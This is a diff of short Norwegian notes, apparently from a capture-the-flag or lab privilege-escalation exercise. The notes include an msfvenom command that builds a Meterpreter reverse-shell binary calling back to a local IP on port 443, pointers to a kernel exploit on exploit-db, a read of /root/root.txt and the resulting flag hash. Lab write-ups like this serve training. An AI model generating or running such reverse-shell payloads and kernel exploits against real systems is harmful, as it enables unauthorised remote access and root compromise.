@@ -42,8 +42,6 @@ kanskje kernel exploit
 
 bruke exploit suggester og teste
 
-
-
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
 ```
@@ -51,4 +49,14 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f e
 lage shell og laste opp så jeg får meterpreter. bra triks
 
 så kjøre exploit suggester og se hva jeg får
+
+bedre å se her. søke på nøyaktig versjon https://www.kernel-exploits.com/
+
+**https://www.exploit-db.com/exploits/15704/**
+
+cat /root/root.txt
+
+**f122331023a9393319a0370129fd9b14**
+
+
 
